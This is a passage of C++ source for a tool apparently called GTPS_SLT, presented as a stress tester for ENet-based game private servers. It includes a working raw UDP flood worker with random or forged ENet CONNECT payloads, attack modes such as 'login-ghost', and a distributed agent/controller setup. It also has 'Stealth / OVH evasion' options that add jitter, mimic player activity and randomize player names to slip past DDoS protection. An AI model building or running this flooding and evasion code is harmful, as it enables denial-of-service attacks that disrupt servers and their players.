        "  --udp-size SIZE      fixed | min | max | mixed | enet (default: fixed)\n"
        "  --payload-type TYPE  garbage | zero | enet-valid (default: garbage)\n\n"
        "Stealth / OVH evasion (v7.1):\n"
        "  --stealth            Enable all evasion features at once\n"
        "  --connect-rate N     Max CONNECT/sec per thread (default: unlimited, stealth: 80)\n"
        "  --mimic-player       Send occasional AFK-like activity (movement, etc)\n"
        "  --randomize-names    Use realistic random player names instead of ghost_1\n"
        "  --jitter-ms N        Random delay +/-N ms between actions (default: 0)\n\n"
        "Recovery measurement:\n"
        "  --cooldown-sec N     Probe RTT for N seconds after flood stops (default: 0=off)\n\n",
        GTPS_SLT_VERSION, prog, DEFAULT_PORT, DEFAULT_CROWD_STAY_MS, DEFAULT_AGENT_PORT);
}

static Config parse_args(int argc, char** argv) {
    Config cfg;
    std::string ini_path;
    // First pass: find --config
    for (int i = 1; i < argc - 1; i++) {
        if (std::string(argv[i]) == "--config") { ini_path = argv[i+1]; break; }
    }
    if (!ini_path.empty()) apply_ini_general(cfg, ini_path);

    // Second pass: CLI overrides
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&]() -> std::string {
            if (i+1 >= argc) {
                fprintf(stderr, "ERROR: option '%s' requires an argument\n", a.c_str());
                exit(1);
            }
            return argv[++i];
        };
        if (a == "--help" || a == "-h") { print_usage(argv[0]); exit(0); }
        else if (a == "--config")        next(); // already handled
        else if (a == "--mode")          cfg.mode      = next();
        else if (a == "--target")        cfg.target    = next();
        else if (a == "--port")          cfg.port      = (uint16_t)std::stoi(next());
        else if (a == "--threads")       cfg.threads   = std::stoi(next());
        else if (a == "--pps")           cfg.pps       = std::stoi(next());
        else if (a == "--duration")      cfg.duration  = std::stoi(next());
        else if (a == "--warmup")        cfg.warmup    = std::stoi(next());
        else if (a == "--clients")       cfg.clients   = std::stoi(next());
        else if (a == "--hosts")         cfg.hosts     = std::stoi(next());
        else if (a == "--world")         cfg.world     = next();
        else if (a == "--crowd")         cfg.crowd_mode = true;
        else if (a == "--crowd-stay-ms") cfg.crowd_stay_ms = std::stoi(next());
        else if (a == "--scenario")      cfg.scenario_file = next();
        else if (a == "--csv")           cfg.csv_file  = next();
        else if (a == "--adaptive")      cfg.adaptive  = true;
        else if (a == "--target-rtt")    cfg.target_rtt_us = std::stod(next()) * 1000.0;
        else if (a == "--dashboard")     cfg.dashboard = true;
        else if (a == "--agent-port")    cfg.agent_port = std::stoi(next());
        else if (a == "--agent-secret" || a == "--secret") cfg.agent_secret = next();
        else if (a == "--agents") {
            std::string agents_str = next();
            std::stringstream ss(agents_str);
            std::string tok;
            while (std::getline(ss, tok, ',')) {
                if (!tok.empty()) cfg.agent_addrs.push_back(trim(tok));
            }
        }
        // v7: canary mode
        else if (a == "--canary-world")  cfg.canary_world  = next();
        else if (a == "--sync-time")     cfg.sync_time_ms  = std::stoll(next());
        // v7: attack modes
        else if (a == "--attack-type")   cfg.attack_type   = next();
        else if (a == "--ghost-after")   cfg.ghost_after   = next();
        else if (a == "--churn-stay-ms") cfg.churn_stay_ms = std::stoi(next());
        else if (a == "--broadcast-burst-ms") cfg.broadcast_burst_ms = std::stoi(next());
        else if (a == "--world-list") {
            std::string wl = next();
            std::istringstream ss(wl);
            std::string w;
            while (std::getline(ss, w, ','))
                if (!w.empty()) cfg.world_list.push_back(w);
        }
        // v7: recovery measurement
        else if (a == "--cooldown-sec")  cfg.cooldown_sec  = std::stoi(next());
        // v7: UDP improvements
        else if (a == "--udp-size")      cfg.udp_size      = next();
        else if (a == "--payload-type")  cfg.payload_type  = next();
        // v7.1: stealth / evasion
        else if (a == "--stealth")       cfg.stealth = true;
        else if (a == "--connect-rate")  cfg.connect_rate  = std::stoi(next());
        else if (a == "--mimic-player")  cfg.mimic_player  = true;
        else if (a == "--randomize-names") cfg.randomize_names = true;
        else if (a == "--jitter-ms")     cfg.jitter_ms     = std::stoi(next());
        // v7.2: multi-peer + new methods
        else if (a == "--peers-per-thread") cfg.peers_per_thread = std::stoi(next());
        else if (a == "--slow-interval-ms") cfg.slow_interval_ms = std::stoi(next());
        else if (a == "--http-target")   cfg.http_target   = next();
        else if (a == "--http-rps")      cfg.http_rps      = std::stoi(next());
        // v10: orchestrator
        else if (a == "--total-connections") cfg.total_connections = std::stoi(next());
        else if (a == "--roles")         cfg.scenario_roles = next();
        else if (a == "--rotate-sec")    cfg.rotate_sec    = std::stoi(next());
        else if (a == "--ramp-sec")      cfg.ramp_sec      = std::stoi(next());
        else if (a == "--adaptive")      cfg.adaptive      = true;
        else if (a == "--mv-scenario")   cfg.mv_scenario_file = next();
    }

    // Defaults
    cfg.tp.constant_pps = cfg.pps;
    cfg.tp.sin_base_pps = cfg.pps;
    cfg.tp.rw_start_pps = cfg.pps;
    // v7: auto-set ghost_after for login-ghost convenience
    if (cfg.attack_type == "login-ghost") cfg.ghost_after = "login";
    // v7.1: --stealth enables all evasion features
    if (cfg.stealth) {
        if (cfg.connect_rate == 0)  cfg.connect_rate = 80;   // conservative rate
        if (cfg.jitter_ms == 0)     cfg.jitter_ms = 50;      // ±50ms jitter
        cfg.mimic_player    = true;
        cfg.randomize_names = true;
    }
    return cfg;
}

// ============================================================================
// Minimal JSON helpers (no external deps)
// ============================================================================

// Extract raw value string for a key in a flat JSON object
static std::string json_raw(const std::string& j, const std::string& key) {
    std::string search = "\"" + key + "\"";
    auto pos = j.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    pos = j.find(':', pos);
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < j.size() && (j[pos] == ' ' || j[pos] == '\t')) pos++;
    if (pos >= j.size()) return "";
    if (j[pos] == '"') {
        pos++;
        std::string val;
        while (pos < j.size() && j[pos] != '"') {
            if (j[pos] == '\\' && pos + 1 < j.size()) { pos++; }
            val += j[pos++];
        }
        return val;
    }
    // number / bool / null
    size_t end = pos;
    while (end < j.size() && j[end] != ',' && j[end] != '}' && j[end] != ' ' && j[end] != '\n') end++;
    return j.substr(pos, end - pos);
}

static std::string json_str(const std::string& j, const std::string& k,
                             const std::string& d = "") {
    auto v = json_raw(j, k); return v.empty() ? d : v;
}
static int64_t json_i64(const std::string& j, const std::string& k, int64_t d = 0) {
    auto v = json_raw(j, k); if (v.empty()) return d;
    try { return std::stoll(v); } catch (...) { return d; }
}
static int json_int(const std::string& j, const std::string& k, int d = 0) {
    return (int)json_i64(j, k, d);
}
static bool json_bool(const std::string& j, const std::string& k, bool d = false) {
    auto v = json_raw(j, k);
    if (v == "true" || v == "1") return true;
    if (v == "false" || v == "0") return false;
    return d;
}

// Build a JSON object (flat, string values)
struct JsonBuild {
    std::string s;
    bool first = true;
    JsonBuild() { s = "{"; }
    JsonBuild& add(const std::string& k, const std::string& v) {
        if (!first) s += ",";
        s += "\"" + k + "\":\"" + v + "\"";
        first = false; return *this;
    }
    JsonBuild& add(const std::string& k, int64_t v) {
        if (!first) s += ",";
        s += "\"" + k + "\":" + std::to_string(v);
        first = false; return *this;
    }
    JsonBuild& add(const std::string& k, double v, int prec = 2) {
        if (!first) s += ",";
        char buf[32]; snprintf(buf, sizeof(buf), "%.*f", prec, v);
        s += "\"" + k + "\":" + buf;
        first = false; return *this;
    }
    JsonBuild& add(const std::string& k, bool v) {
        if (!first) s += ",";
        s += "\"" + k + "\":" + (v ? "true" : "false");
        first = false; return *this;
    }
    std::string str() const { return s + "}"; }
};

// ============================================================================
// TCP socket helpers (for agent/controller)
// ============================================================================

static int tcp_listen(int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in addr{};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons((uint16_t)port);
    if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd); return -1;
    }
    listen(fd, 4);
    return fd;
}

static int tcp_connect(const std::string& ip, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0) {
        close(fd); return -1;
    }
    struct timeval tv{ 5, 0 };
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd); return -1;
    }
    return fd;
}

// Read a full newline-terminated line from fd (blocking)
// Returns false on EOF/error
static bool tcp_readline(int fd, std::string& line, int timeout_ms = 5000) {
    line.clear();
    auto deadline = now_ms() + timeout_ms;
    while (now_ms() < deadline) {
        char c;
        struct timeval tv;
        tv.tv_sec  = 0;
        tv.tv_usec = 50000; // 50ms chunk
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        ssize_t n = recv(fd, &c, 1, 0);
        if (n == 0) return false;   // EOF
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            return false;
        }
        if (c == '\n') return true;
        line += c;
    }
    return false; // timeout
}

static bool tcp_send_line(int fd, const std::string& line) {
    std::string s = line + "\n";
    ssize_t total = 0;
    while (total < (ssize_t)s.size()) {
        ssize_t n = send(fd, s.data() + total, s.size() - total, MSG_NOSIGNAL);
        if (n <= 0) return false;
        total += n;
    }
    return true;
}

// Parse "ip:port" string
static bool parse_addr(const std::string& addr_str, std::string& ip, int& port) {
    auto colon = addr_str.rfind(':');
    if (colon == std::string::npos) return false;
    ip   = addr_str.substr(0, colon);
    try { port = std::stoi(addr_str.substr(colon + 1)); }
    catch (...) { return false; }
    return port > 0 && port < 65536;
}

// ============================================================================
// ScenarioRunner
// ============================================================================

struct ScenarioPhase {
    std::string name;
    int         duration    = 60;
    int         pps         = DEFAULT_PPS;
    std::string world;
    PatternType pattern     = PatternType::CONSTANT;
    int         tile_burst_count = DEFAULT_TILE_BURST_COUNT;
    int         tile_burst_ms    = DEFAULT_TILE_BURST_MS;
    int         target_clients   = 0;
    bool        crowd_mode       = false;
    int         crowd_stay_ms    = DEFAULT_CROWD_STAY_MS;
};

class ScenarioRunner {
public:
    std::vector<ScenarioPhase> phases;
    std::atomic<int>  current_phase_idx {0};
    std::atomic<int>  phase_elapsed_sec {0};

    bool load(const std::string& path) {
        auto secs = ini_phase_sections(path);
        if (secs.empty()) return false;
        phases.clear();
        ScenarioPhase prev;
        prev.pps   = g_phase.pps.load();
        prev.world = g_phase.get_world();
        for (auto& sec : secs) {
            auto kv = load_ini_section(path, sec);
            auto gs = [&](const std::string& k, const std::string& d="") {
                auto it = kv.find(k); return (it != kv.end()) ? it->second : d;
            };
            auto gi = [&](const std::string& k, int d) {
                auto it = kv.find(k); return (it != kv.end()) ? std::stoi(it->second) : d;
            };
            auto gb = [&](const std::string& k, bool d) {
                auto it = kv.find(k);
                if (it == kv.end()) return d;
                return it->second == "true" || it->second == "1";
            };
            ScenarioPhase ph;
            ph.name             = gs("name", sec);
            ph.duration         = gi("duration",          prev.duration);
            ph.pps              = gi("pps",               prev.pps);
            ph.world            = gs("world",             prev.world);
            ph.tile_burst_count = gi("tile_burst_count",  prev.tile_burst_count);
            ph.tile_burst_ms    = gi("tile_burst_ms",     prev.tile_burst_ms);
            ph.target_clients   = gi("clients",           0);
            ph.crowd_mode       = gb("crowd_mode",        false);
            ph.crowd_stay_ms    = gi("crowd_stay_ms",     DEFAULT_CROWD_STAY_MS);
            auto ps = gs("pattern", "constant");
            auto pit = PATTERN_MAP.find(ps); 
            ph.pattern = (pit != PATTERN_MAP.end()) ? pit->second : PatternType::CONSTANT;
            phases.push_back(ph);
            prev = ph;
        }
        return !phases.empty();
    }

    void run() {
        for (int i = 0; i < (int)phases.size() && g_running.load(); i++) {
            auto& ph = phases[i];
            current_phase_idx.store(i);
            phase_elapsed_sec.store(0);

            // Apply phase to g_phase
            g_phase.pps.store(ph.pps);
            g_phase.tile_burst_count.store(ph.tile_burst_count);
            g_phase.tile_burst_ms.store(ph.tile_burst_ms);
            g_phase.pattern_idx.store((int)ph.pattern);
            g_phase.phase_num.store(i + 1);
            g_phase.target_clients.store(ph.target_clients);
            g_phase.crowd_mode.store(ph.crowd_mode);
            g_phase.crowd_stay_ms.store(ph.crowd_stay_ms);
            g_phase.set_world(ph.world);
            g_phase.set_phase_name(ph.name);

            printf("[scenario] Phase %d/%d: %s  pps=%d  clients=%d  crowd=%s  duration=%ds\n",
                i+1, (int)phases.size(), ph.name.c_str(), ph.pps,
                ph.target_clients, ph.crowd_mode ? "on" : "off", ph.duration);

            for (int s = 0; s < ph.duration && g_running.load(); s++) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
                phase_elapsed_sec.store(s + 1);
            }
        }
        if (g_running.load()) {
            printf("[scenario] All phases complete.\n");
            g_running.store(false);
        }
    }
};

// ============================================================================
// CSV writer
// ============================================================================

struct CSVWriter {
    std::ofstream f;
    bool open(const std::string& path) {
        f.open(path, std::ios::out | std::ios::trunc);
        if (!f.is_open()) return false;
        f << "t,pps,mbps,rtt_p50_us,rtt_p95_us,rtt_p99_us,"
             "active_clients,clients_in_world,world_kbps_rx,"
             "tile_bursts,world_joins,errors,phase,phase_num\n";
        return true;
    }
    void write_row(int t, double pps, double mbps,
                   uint64_t p50, uint64_t p95, uint64_t p99,
                   int active, int cw, double world_kbps,
                   uint64_t bursts, uint64_t joins, uint64_t errs,
                   const std::string& phase, int phase_num) {
        f << t << "," << pps << "," << mbps << ","
          << p50 << "," << p95 << "," << p99 << ","
          << active << "," << cw << "," << world_kbps << ","
          << bursts << "," << joins << "," << errs << ","
          << phase << "," << phase_num << "\n";
        f.flush();
    }
};

// ============================================================================
// game_adaptive_worker — runs on each thread
// ============================================================================

static void game_adaptive_worker(int thread_idx, const Config& cfg) {
    ThreadStats& ts = *g_stats[thread_idx];

    // Create ENet host groups
    int clients_per_thread = cfg.clients / std::max(1, cfg.threads);
    int hosts_per_thread   = cfg.hosts;
    int clients_per_host   = std::max(1, clients_per_thread / hosts_per_thread);

    std::vector<HostGroup> groups;
    for (int h = 0; h < hosts_per_thread; h++) {
        HostGroup grp;
        grp.host = enet_host_create(nullptr, clients_per_host + 8, 2, 0, 0);
        if (!grp.host) continue;
        groups.push_back(std::move(grp));
    }
    if (groups.empty()) return;

    auto make_client = [&](HostGroup& grp) -> GameClientSimV6* {
        ENetAddress addr{};
        enet_address_set_host(&addr, cfg.target.c_str());
        addr.port = cfg.port;
        ENetPeer* peer = enet_host_connect(grp.host, &addr, 2, 0);
        if (!peer) return nullptr;
        auto* c = new GameClientSimV6;
        c->peer        = peer;
        c->state       = ClientState::CONNECTING;
        c->state_enter = now_ms();
        c->thread_idx  = thread_idx;
        c->enet_host   = grp.host;
        return c;
    };

    // Initial spawn
    for (auto& grp : groups) {
        for (int i = 0; i < clients_per_host; i++) {
            auto* c = make_client(grp);
            if (c) grp.clients.push_back(c);
        }
    }

    // Traffic pattern
    int        last_pps        = cfg.pps;
    int        last_pattern    = (int)cfg.pattern;
    TrafficPattern pat;
    pat.reset(cfg.pattern, cfg.tp);
    TokenBucket bucket(cfg.pps);

    // PID state
    double pid_integral = 0.0;
    double pid_prev_err = 0.0;
    int    cur_pps      = cfg.pps;

    std::string last_world = cfg.world;

    while (g_running.load()) {
        // Read phase
        int  ph_pps     = g_phase.pps.load(std::memory_order_relaxed);
        int  ph_pattern = g_phase.pattern_idx.load(std::memory_order_relaxed);
        int  ph_tgt_cli = g_phase.target_clients.load(std::memory_order_relaxed);
        std::string ph_world = g_phase.get_world();

        // Live reconfigure pattern
        if (ph_pps != last_pps || ph_pattern != last_pattern) {
            pat.reset(PatternType(ph_pattern), make_phase_tp(cfg.tp, ph_pps));
            bucket.set_rate(ph_pps);
            last_pps = ph_pps;
            last_pattern = ph_pattern;
        }

        // Scale clients (v5: live scaling)
        if (ph_tgt_cli > 0) {
            int total_active = 0;
            for (auto& grp : groups) {
                for (auto* c : grp.clients)
                    if (!c->is_draining()) total_active++;
            }
            int per_thread_target = ph_tgt_cli / std::max(1, cfg.threads);
            if (total_active < per_thread_target) {
                // Scale up: add to largest group
                int diff = per_thread_target - total_active;
                diff = std::min(diff, 10); // max 10 new per tick
                for (int i = 0; i < diff; i++) {
                    auto& grp = groups[i % groups.size()];
                    auto* c = make_client(grp);
                    if (c) grp.clients.push_back(c);
                }
            } else if (total_active > per_thread_target) {
                // Scale down: drain excess from back
                int excess = total_active - per_thread_target;
                for (auto& grp : groups) {
                    for (int i = (int)grp.clients.size() - 1; i >= 0 && excess > 0; i--) {
                        if (!grp.clients[i]->is_draining()) {
                            grp.clients[i]->drain_ = true;
                            excess--;
                        }
                    }
                }
            }
        }

        // ENet service all hosts
        for (auto& grp : groups) {
            ENetEvent evt;
            while (enet_host_service(grp.host, &evt, 0) > 0) {
                // Find client for this peer
                GameClientSimV6* found = nullptr;
                for (auto* c : grp.clients) {
                    if (c->peer == evt.peer) { found = c; break; }
                }
                if (evt.type == ENET_EVENT_TYPE_CONNECT) {
                    if (found) found->on_connect();
                } else if (evt.type == ENET_EVENT_TYPE_RECEIVE) {
                    if (found) found->on_receive(evt.packet, ts);
                    if (evt.packet) enet_packet_destroy(evt.packet);
                } else if (evt.type == ENET_EVENT_TYPE_DISCONNECT) {
                    if (found) found->on_disconnect();
                }
            }
        }

        // Update each client, reconnect disconnected ones
        int active_count = 0;
        for (auto& grp : groups) {
            // Remove fully disconnected draining clients
            grp.clients.erase(
                std::remove_if(grp.clients.begin(), grp.clients.end(),
                    [](GameClientSimV6* c) {
                        if (c->state == ClientState::DISCONNECTED && c->is_draining()) {
                            delete c; return true;
                        }
                        return false;
                    }),
                grp.clients.end());

            for (auto* c : grp.clients) {
                if (!c->is_draining()) active_count++;
                if (c->state == ClientState::CONNECTING && c->peer == nullptr) {
                    // Reconnect
                    ENetAddress addr{};
                    enet_address_set_host(&addr, cfg.target.c_str());
                    addr.port = cfg.port;
                    c->peer = enet_host_connect(grp.host, &addr, 2, 0);
                }
                c->update(ts, ph_world);
            }
        }
        ts.active_clients.store(active_count, std::memory_order_relaxed);

        // Rate-limited main packet (move/ping)
        double target_pps = pat.current_pps();
        if (cfg.adaptive) {
            // PID control
            uint64_t rtt = ts.last_rtt_us.load(std::memory_order_relaxed);
            double err = (double)rtt - cfg.target_rtt_us;
            pid_integral += err;
            double deriv = err - pid_prev_err;
            pid_prev_err = err;
            double adj = cfg.pid_kp * err + cfg.pid_ki * pid_integral + cfg.pid_kd * deriv;
            cur_pps = std::max(10, (int)(cur_pps - adj));
            target_pps = cur_pps;
        }
        bucket.set_rate(std::max(1.0, target_pps));
        bucket.consume(1);
    }

    // Cleanup
    for (auto& grp : groups) {
        for (auto* c : grp.clients) delete c;
        if (grp.host) enet_host_destroy(grp.host);
    }
}

// ============================================================================
// UDP worker (raw flood)
// ============================================================================

static void udp_worker(int thread_idx, const Config& cfg) {
    ThreadStats& ts = *g_stats[thread_idx];

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;

    struct sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port   = htons(cfg.port);
    inet_pton(AF_INET, cfg.target.c_str(), &target.sin_addr);

    // v7: payload buffer (max 1400 bytes for non-fragmented UDP)
    static const int MAX_UDP_PAYLOAD = 1400;
    uint8_t payload_buf[MAX_UDP_PAYLOAD];
    std::mt19937 rng(std::random_device{}() ^ (thread_idx * 41));

    // v7: ENet-valid header template (for enet-valid payload type)
    auto fill_enet_valid = [&](uint8_t* buf, int len) {
        memset(buf, 0, len);
        // ENet protocol header (4 bytes)
        buf[0] = 0xFF; buf[1] = 0xFF;  // peerID = 0xFFFF
        uint16_t st = (uint16_t)(now_ms() & 0xFFFF);
        buf[2] = (st >> 8) & 0xFF; buf[3] = st & 0xFF;
        // ENet CONNECT command header
        if (len > 4) buf[4] = 0x81;    // CONNECT | FLAG_ACKNOWLEDGE
        if (len > 5) buf[5] = 0xFF;    // channelID
        // Rest random
        for (int i = 8; i < len; i++) buf[i] = rng() & 0xFF;
    };

    // Prepare based on payload type
    auto fill_payload = [&](uint8_t* buf, int len) {
        if (cfg.payload_type == "zero") {
            memset(buf, 0, len);
        } else if (cfg.payload_type == "enet-valid") {
            fill_enet_valid(buf, len);
        } else {
            // garbage (default): random bytes
            for (int i = 0; i < len; i += 4) {
                uint32_t r = rng();
                int copy = std::min(4, len - i);
                memcpy(buf + i, &r, copy);
            }
        }
    };

    // Size picker
    auto pick_size = [&]() -> int {
        if (cfg.udp_size == "min")   return 1;
        if (cfg.udp_size == "max")   return MAX_UDP_PAYLOAD;
        if (cfg.udp_size == "enet")  return 28 + (rng() % 17);  // 28-44 bytes
        if (cfg.udp_size == "mixed") return 1 + (rng() % MAX_UDP_PAYLOAD);
        // "fixed" (default): original 22-byte payload
        return 22;
    };

    TrafficPattern pat;
    pat.reset(cfg.pattern, cfg.tp);
    TokenBucket bucket(cfg.pps);

    int last_pps     = cfg.pps;
    int last_pattern = (int)cfg.pattern;

    while (g_running.load()) {
        int ph_pps     = g_phase.pps.load(std::memory_order_relaxed);
        int ph_pattern = g_phase.pattern_idx.load(std::memory_order_relaxed);
        if (ph_pps != last_pps || ph_pattern != last_pattern) {
            pat.reset(PatternType(ph_pattern), make_phase_tp(cfg.tp, ph_pps));
            bucket.set_rate(ph_pps);
            last_pps = ph_pps; last_pattern = ph_pattern;
        }
        double tpps = pat.current_pps();
        bucket.set_rate(std::max(1.0, tpps));
        bucket.consume(1);

        // v7: dynamic size and payload
        int pkt_size = pick_size();
        fill_payload(payload_buf, pkt_size);

        int64_t ts_send = now_us();
        ssize_t n = sendto(fd, payload_buf, pkt_size, 0,
                           (struct sockaddr*)&target, sizeof(target));
        if (n > 0) {
            if (!g_in_warmup.load()) {
                ts.packets_sent.fetch_add(1, std::memory_order_relaxed);
                ts.bytes_sent.fetch_add(n, std::memory_order_relaxed);
            }
        } else {
            ts.errors.fetch_add(1, std::memory_order_relaxed);
        }
        (void)ts_send;
    }
    close(fd);
}

// ============================================================================
// v7: run_canary — single stable client that measures RTT during stress test
//
// Canary proxy-s "pengalaman pemain nyata": connect → login → join world →
// duduk diam sambil kirim periodic ping → catat RTT tiap detik ke CSV.
// Saat RTT spike = server mulai kewalahan.
// Saat canary disconnect = pemain nyata juga terdampak.
//
// Jalankan di VPS TERPISAH dari agent stress, agar canary mengalami
// network path yang sama dengan pemain nyata.
// ============================================================================

// Forward declaration — defined later in file
static std::string build_login_packet(const std::string& name, std::mt19937& rng);

static void run_canary(const Config& cfg) {
    ENetHost* host = enet_host_create(nullptr, 2, 2, 0, 0);
    if (!host) { fprintf(stderr, "[canary] ENet host_create failed\n"); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    // Canary state machine (local, separate from GameClientSimV6)
    enum CanaryState { C_CONNECTING, C_WAIT_LOGIN, C_LOBBY, C_JOINING, C_IN_WORLD, C_DISCONNECTED };
    CanaryState state = C_CONNECTING;
    int64_t state_enter = now_ms();
    ENetPeer* peer = enet_host_connect(host, &addr, 2, 0);
    if (!peer) {
        fprintf(stderr, "[canary] initial connect failed\n");
        enet_host_destroy(host);
        return;
    }

    // RTT tracking — collect samples per second, compute percentiles
    std::vector<uint64_t> rtt_samples;
    rtt_samples.reserve(256);
    bool connected = false;
    int64_t last_ping = 0;

    // CSV
    std::ofstream csv_f;
    std::string csv_path;
    if (!cfg.csv_file.empty()) {
        csv_path = "canary_" + cfg.csv_file;
        if (csv_path.find(".csv") == std::string::npos) csv_path += ".csv";
        csv_f.open(csv_path, std::ios::out | std::ios::trunc);
        if (csv_f.is_open())
            csv_f << "t,rtt_p50_us,rtt_p95_us,connected\n";
    }

    // Time base: sync with controller if --sync-time set
    int64_t t0 = (cfg.sync_time_ms > 0) ? cfg.sync_time_ms : now_ms();
    int tick = 0;
    int64_t next_report = t0 + 1000;

    auto do_reconnect = [&]() {
        if (peer) { enet_peer_disconnect_now(peer, 0); peer = nullptr; }
        peer = enet_host_connect(host, &addr, 2, 0);
        state = C_CONNECTING;
        state_enter = now_ms();
        connected = false;
    };

    printf("[canary] target=%s:%d  world='%s'  synced=%s\n",
           cfg.target.c_str(), cfg.port, cfg.canary_world.c_str(),
           cfg.sync_time_ms > 0 ? "yes" : "no");

    while (g_running.load()) {
        // ENet service — short timeout agar responsive ke g_running
        ENetEvent evt;
        while (enet_host_service(host, &evt, 25) > 0) {
            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                connected = true;
                state = C_WAIT_LOGIN;
                state_enter = now_ms();
                {
                    // v7.1 fix: use full login packet (same as attack methods)
                    static std::mt19937 canary_rng(std::random_device{}() ^ 0xCA);
                    std::string name = "Canary" + std::to_string(now_ms() % 9999);
                    std::string login = build_login_packet(name, canary_rng);
                    int len = (int)login.size();
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4,
                                                         ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(peer, 0, pkt);
                }
                printf("[canary] connected\n");
                break;

            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t msg_type = ((uint8_t*)evt.packet->data)[0];
                    const char* text = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";

                    if (state == C_WAIT_LOGIN && msg_type == NET_MESSAGE_GENERIC_TEXT) {
                        state = C_LOBBY;
                        state_enter = now_ms();
                    }
                    if (state == C_JOINING && msg_type == NET_MESSAGE_GENERIC_TEXT) {
                        if (strstr(text, "action|spawn") || strstr(text, "OnSpawn")) {
                            state = C_IN_WORLD;
                            state_enter = now_ms();
                            printf("[canary] entered world '%s'\n", cfg.canary_world.c_str());
                        }
                    }
                }
                // Record RTT sample on every received packet (freshest value)
                if (peer)
                    rtt_samples.push_back((uint64_t)peer->roundTripTime * 1000);
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;

            case ENET_EVENT_TYPE_DISCONNECT:
                connected = false;
                peer = nullptr;
                state = C_DISCONNECTED;
                state_enter = now_ms();
                printf("[canary] disconnected (t=%d)\n", tick);
                break;

            case ENET_EVENT_TYPE_NONE:
                break;
            }
        }

        int64_t now = now_ms();

        // State transitions — gentle, no aggressive behavior
        switch (state) {
        case C_LOBBY:
            if (now - state_enter > WORLD_JOIN_DELAY_MS) {
                char buf[64];
                int len = snprintf(buf, sizeof(buf),
                    "action|join_request\nname|%s\n", cfg.canary_world.c_str());
                if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                ENetPacket* pkt = enet_packet_create(nullptr, len + 4,
                                                     ENET_PACKET_FLAG_RELIABLE);
                ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                memset((uint8_t*)pkt->data + 1, 0, 3);
                memcpy((uint8_t*)pkt->data + 4, buf, len);
                enet_peer_send(peer, 0, pkt);
                state = C_JOINING;
                state_enter = now;
            }
            break;
        case C_WAIT_LOGIN:
            if (now - state_enter > 5000) do_reconnect();
            break;
        case C_JOINING:
            if (now - state_enter > 8000) { state = C_LOBBY; state_enter = now; }
            break;
        case C_DISCONNECTED:
            // Gentle reconnect after 2 seconds
            if (now - state_enter > 2000) do_reconnect();
            break;
        case C_IN_WORLD:
            // Periodic lightweight ping to keep connection alive & measure RTT
            if (now - last_ping > 1000) {
                TankPacket tp{};
                tp.type = 0x16;  // ping type
                ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, 0);
                ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                memset((uint8_t*)pkt->data + 1, 0, 3);
                memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                enet_peer_send(peer, 1, pkt);
                last_ping = now;
                // Also sample RTT on ping
                if (peer)
                    rtt_samples.push_back((uint64_t)peer->roundTripTime * 1000);
            }
            break;
        case C_CONNECTING:
            if (now - state_enter > 5000) do_reconnect();
            break;
        }

        // --- Per-second report tick ---
        if (now >= next_report) {
            tick++;

            uint64_t p50 = 0, p95 = 0;
            if (!rtt_samples.empty()) {
                std::sort(rtt_samples.begin(), rtt_samples.end());
                size_t n = rtt_samples.size();
                p50 = rtt_samples[(n - 1) * 50 / 100];
                p95 = rtt_samples[(n - 1) * 95 / 100];
            }
            int conn = connected ? 1 : 0;

            printf("[canary t=%4d]  p50=%6.2fms  p95=%6.2fms  conn=%d  samples=%zu\n",
                   tick, p50 / 1000.0, p95 / 1000.0, conn, rtt_samples.size());

            if (csv_f.is_open()) {
                csv_f << tick << "," << p50 << "," << p95 << "," << conn << "\n";
                csv_f.flush();
            }

            rtt_samples.clear();
            next_report += 1000;
        }
    }

    // Cleanup
    if (peer) enet_peer_disconnect_now(peer, 0);
    enet_host_flush(host);
    enet_host_destroy(host);

    printf("[canary] done — %d ticks recorded\n", tick);
    if (csv_f.is_open()) {
        csv_f.close();
        printf("[canary] CSV → %s\n", csv_path.c_str());
    }
}

// ============================================================================
// v7.1: Stealth utilities — name randomization, jitter, mimicry
// ============================================================================

static std::string generate_random_name(std::mt19937& rng) {
    static const char* prefixes[] = {
        "Pro", "xX", "Dark", "Ice", "Fire", "Cool", "Epic", "Nova",
        "Mega", "Ultra", "King", "Lord", "Star", "Max", "Top", "Big",
